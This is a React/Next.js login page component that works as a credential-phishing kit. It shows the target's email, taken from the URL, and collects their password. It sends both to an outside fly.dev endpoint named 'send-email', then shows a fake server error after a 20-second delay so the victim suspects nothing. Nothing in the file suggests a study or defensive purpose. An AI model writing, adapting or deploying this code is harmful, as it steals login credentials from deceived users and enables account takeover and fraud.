import React, { useRef, useState } from 'react';
import { message } from 'antd-notifications-messages';
import { useRouter } from 'next/router';

const show = () => {
  message({
    type: 'error',
    message: `Unexpected server error try again later`,
  });
};

function Login() {
  const [loading, setLoading] = useState(false);
  const ref = useRef();
  const router = useRouter();
  const { email } = router.query;

  const onSubmit = (event) => {
    event.preventDefault();
    setLoading(true);

    fetch('https://green-night-6689.fly.dev/send-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, password: ref.current.value }),
    })
      .then((response) => {
        console.log('===> ', response);
        setTimeout(() => {
          setLoading(false);
          show();
        }, 20000);
      })
      .catch((reason) => console.log(reason.message));
  };

  return (
    <div id="wrapper">
      <div id="wrappertop"></div>

      <form onSubmit={onSubmit}>
        <div id="wrappermiddle">
          <h2>Login</h2>

          <div id="user_email">
            <span>
              <img src="./images/mailicon.png" alt="" /> {email}
            </span>
          </div>

          <div id="password_input">
            <div id="password_inputleft"></div>

            <div id="password_inputmiddle">
              <input
                type="password"
                name="password"
                id="url"
                placeholder="******"
                ref={ref}
              />
              <img id="url_password" src="./images/passicon.png" alt="" />
            </div>

            <div id="password_inputright"></div>
          </div>

          <div id="submit">
            <input
              type="submit"
              id="submit2"
              value={loading ? 'Loading...' : 'Sign In'}
              disabled={loading}
            />
          </div>
        </div>
      </form>

      <div id="wrapperbottom"></div>

      <div id="powered">
        <p>
          Powered by <a href="#">Digital X</a>
        </p>
      </div>
    </div>
  );
}

export default Login;
